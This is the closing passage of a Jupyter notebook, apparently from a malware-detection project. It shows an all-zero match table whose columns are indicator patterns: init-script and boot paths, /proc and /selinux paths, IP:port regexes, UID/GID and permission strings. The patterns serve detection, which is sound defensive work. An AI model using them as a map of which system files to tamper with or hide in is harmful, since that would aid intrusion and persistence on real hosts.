       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>28</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>32 rows × 32 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "    bin/sed  /etc/rc  /etc/init.d/  /proc/  /etc/sed  /selinux  /boot/  \\\n",
       "0         0        0             0       0         0         0       0   \n",
       "1         0        0             0       0         0         0       0   \n",
       "2         0        0             0       0         0         0       0   \n",
       "3         0        0             0       0         0         0       0   \n",
       "4         0        0             0       0         0         0       0   \n",
       "5         0        0             0       0         0         0       0   \n",
       "6         0        0             0       0         0         0       0   \n",
       "7         0        0             0       0         0         0       0   \n",
       "8         0        0             0       0         0         0       0   \n",
       "9         0        0             0       0         0         0       0   \n",
       "10        0        0             0       0         0         0       0   \n",
       "11        0        0             0       0         0         0       0   \n",
       "12        0        0             0       0         0         0       0   \n",
       "13        0        0             0       0         0         0       0   \n",
       "14        0        0             0       0         0         0       0   \n",
       "15        0        0             0       0         0         0       0   \n",
       "16        0        0             0       0         0         0       0   \n",
       "17        0        0             0       0         0         0       0   \n",
       "18        0        0             0       0         0         0       0   \n",
       "19        0        0             0       0         0         0       0   \n",
       "20        0        0             0       0         0         0       0   \n",
       "21        0        0             0       0         0         0       0   \n",
       "22        0        0             0       0         0         0       0   \n",
       "23        0        0             0       0         0         0       0   \n",
       "24        0        0             0       0         0         0       0   \n",
       "25        0        0             0       0         0         0       0   \n",
       "26        0        0             0       0         0         0       0   \n",
       "27        0        0             0       0         0         0       0   \n",
       "28        0        0             0       0         0         0       0   \n",
       "29        0        0             0       0         0         0       0   \n",
       "30        0        0             0       0         0         0       0   \n",
       "31        0        0             0       0         0         0       0   \n",
       "\n",
       "    /proc/rs_dev  /boot/[a-z]{10}  /run/  ...  ^pipe(\\$|\\.|$)  \\\n",
       "0              0                0      0  ...               0   \n",
       "1              0                0      0  ...               0   \n",
       "2              0                0      0  ...               0   \n",
       "3              0                0      0  ...               0   \n",
       "4              0                0      0  ...               0   \n",
       "5              0                0      0  ...               0   \n",
       "6              0                0      0  ...               0   \n",
       "7              0                0      0  ...               0   \n",
       "8              0                0      0  ...               0   \n",
       "9              0                0      0  ...               0   \n",
       "10             0                0      0  ...               0   \n",
       "11             0                0      0  ...               0   \n",
       "12             0                0      0  ...               0   \n",
       "13             0                0      0  ...               0   \n",
       "14             0                0      0  ...               0   \n",
       "15             0                0      0  ...               0   \n",
       "16             0                0      0  ...               0   \n",
       "17             0                0      0  ...               0   \n",
       "18             0                0      0  ...               0   \n",
       "19             0                0      0  ...               0   \n",
       "20             0                0      0  ...               0   \n",
       "21             0                0      0  ...               0   \n",
       "22             0                0      0  ...               0   \n",
       "23             0                0      0  ...               0   \n",
       "24             0                0      0  ...               0   \n",
       "25             0                0      0  ...               0   \n",
       "26             0                0      0  ...               0   \n",
       "27             0                0      0  ...               0   \n",
       "28             0                0      0  ...               0   \n",
       "29             0                0      0  ...               0   \n",
       "30             0                0      0  ...               0   \n",
       "31             0                0      0  ...               0   \n",
       "\n",
       "    \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}  [a-zA-z]:\\d{1,5}$  port \\d{1,5}$  \\\n",
       "0                                    0                  0              0   \n",
       "1                                    0                  0              0   \n",
       "2                                    0                  0              0   \n",
       "3                                    0                  0              0   \n",
       "4                                    0                  0              0   \n",
       "5                                    0                  0              0   \n",
       "6                                    0                  0              0   \n",
       "7                                    0                  0              0   \n",
       "8                                    0                  0              0   \n",
       "9                                    0                  0              0   \n",
       "10                                   0                  0              0   \n",
       "11                                   0                  0              0   \n",
       "12                                   0                  0              0   \n",
       "13                                   0                  0              0   \n",
       "14                                   0                  0              0   \n",
       "15                                   0                  0              0   \n",
       "16                                   0                  0              0   \n",
       "17                                   0                  0              0   \n",
       "18                                   0                  0              0   \n",
       "19                                   0                  0              0   \n",
       "20                                   0                  0              0   \n",
       "21                                   0                  0              0   \n",
       "22                                   0                  0              0   \n",
       "23                                   0                  0              0   \n",
       "24                                   0                  0              0   \n",
       "25                                   0                  0              0   \n",
       "26                                   0                  0              0   \n",
       "27                                   0                  0              0   \n",
       "28                                   0                  0              0   \n",
       "29                                   0                  0              0   \n",
       "30                                   0                  0              0   \n",
       "31                                   0                  0              0   \n",
       "\n",
       "    \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d{1,5}$  0x[0-9a-zA-Z]{8}  \\\n",
       "0                                             0                 0   \n",
       "1                                             0                 0   \n",
       "2                                             0                 0   \n",
       "3                                             0                 0   \n",
       "4                                             0                 0   \n",
       "5                                             0                 0   \n",
       "6                                             0                 0   \n",
       "7                                             0                 0   \n",
       "8                                             0                 0   \n",
       "9                                             0                 0   \n",
       "10                                            0                 0   \n",
       "11                                            0                 0   \n",
       "12                                            0                 0   \n",
       "13                                            0                 0   \n",
       "14                                            0                 0   \n",
       "15                                            0                 0   \n",
       "16                                            0                 0   \n",
       "17                                            0                 0   \n",
       "18                                            0                 0   \n",
       "19                                            0                 0   \n",
       "20                                            0                 0   \n",
       "21                                            0                 0   \n",
       "22                                            0                 0   \n",
       "23                                            0                 0   \n",
       "24                                            0                 0   \n",
       "25                                            0                 0   \n",
       "26                                            0                 0   \n",
       "27                                            0                 0   \n",
       "28                                            0                 0   \n",
       "29                                            0                 0   \n",
       "30                                            0                 0   \n",
       "31                                            0                 0   \n",
       "\n",
       "    UID(\\$|\\.|$)  GID(\\$|\\.|$)  permission(\\s|:)[0-9]{1,4}  match  \n",
       "0              0             0                           0      0  \n",
       "1              0             0                           0      0  \n",
       "2              0             0                           0      0  \n",
       "3              0             0                           0      0  \n",
       "4              0             0                           0      0  \n",
       "5              0             0                           0      0  \n",
       "6              0             0                           0      0  \n",
       "7              0             0                           0      0  \n",
       "8              0             0                           0      0  \n",
       "9              0             0                           0      0  \n",
       "10             0             0                           0      0  \n",
       "11             0             0                           0      0  \n",
       "12             0             0                           0      0  \n",
       "13             0             0                           0      0  \n",
       "14             0             0                           0      0  \n",
       "15             0             0                           0      0  \n",
       "16             0             0                           0      0  \n",
       "17             0             0                           0      0  \n",
       "18             0             0                           0      0  \n",
       "19             0             0                           0      0  \n",
       "20             0             0                           0      0  \n",
       "21             0             0                           0      0  \n",
       "22             0             0                           0      0  \n",
       "23             0             0                           0      0  \n",
       "24             0             0                           0      0  \n",
       "25             0             0                           0      0  \n",
       "26             0             0                           0      0  \n",
       "27             0             0                           0      0  \n",
       "28             0             0                           0      0  \n",
       "29             0             0                           0      0  \n",
       "30             0             0                           0      0  \n",
       "31             0             0                           0      0  \n",
       "\n",
       "[32 rows x 32 columns]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "for rem in fset.rem_lst:\n",
    "    display(rem.get_match_sentences())\n",
    "    break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "125a1d8b627fe68767755740015967bae857d08bb92fb3fd0d9d8ed24f978d39"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
